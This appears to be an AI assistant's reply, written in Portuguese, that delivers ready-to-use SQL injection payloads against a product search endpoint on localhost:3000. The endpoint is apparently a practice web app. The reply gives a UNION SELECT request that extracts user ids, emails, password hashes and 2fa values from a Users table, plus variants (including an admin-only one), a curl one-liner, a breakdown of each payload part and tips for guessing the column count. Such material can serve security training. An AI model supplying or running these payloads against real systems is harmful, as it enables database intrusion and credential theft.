Aqui está o payload no formato Burp Suite (GET):

## 🔍 Payload para SQL Injection - Burp Suite Format

```http
GET /rest/products/search?q=')) UNION SELECT '1',id,email,password,'2fa',null,null,null,null FROM Users-- HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
```

## 📋 Variações do payload:

### **Versão básica:**
```http
GET /rest/products/search?q=')) UNION SELECT '1',id,email,password,'2fa',null,null,null,null FROM Users-- HTTP/1.1
```

### **Com mais colunas se necessário:**
```http
GET /rest/products/search?q=')) UNION SELECT '1',id,email,password,'2fa',null,null,null,null,null,null FROM Users-- HTTP/1.1
```

### **Para ver apenas admin:**
```http
GET /rest/products/search?q=')) UNION SELECT '1',id,email,password,'2fa',null,null,null,null FROM Users WHERE role='admin'-- HTTP/1.1
```

## 🛠️ Usando com curl:

```bash
curl "http://localhost:3000/rest/products/search?q='))%20UNION%20SELECT%20'1',id,email,password,'2fa',null,null,null,null%20FROM%20Users--"
```

## 📝 Explicação do payload:

- **`'))`** - Fecha a query original
- **`UNION SELECT`** - Injeta nova query
- **`'1'`** - Preenche a primeira coluna (string)
- **`id,email,password,'2fa'`** - Dados que queremos extrair
- **`null,null,null,null`** - Preenche colunas restantes
- **`FROM Users`** - Tabela alvo
- **`--`** - Comenta o resto da query

## 🔄 Se não funcionar, tente estas variações:

**Tentativa 2:**
```http
GET /rest/products/search?q=')) UNION SELECT 1,id,email,password,'2fa',6,7,8,9 FROM Users-- HTTP/1.1
```

**Tentativa 3 (com diferentes números de colunas):**
```http
GET /rest/products/search?q=')) UNION SELECT '1',id,email,password,'2fa' FROM Users-- HTTP/1.1
```

## 💡 Dica importante:

Verifique quantas colunas a query original retorna testando:
```http
GET /rest/products/search?q=')) UNION SELECT null,null,null,null,null,null,null,null,null-- HTTP/1.1
```

E vá aumentando/diminuindo os `null` até não dar erro.

Quer que eu ajuste algo específico no payload?
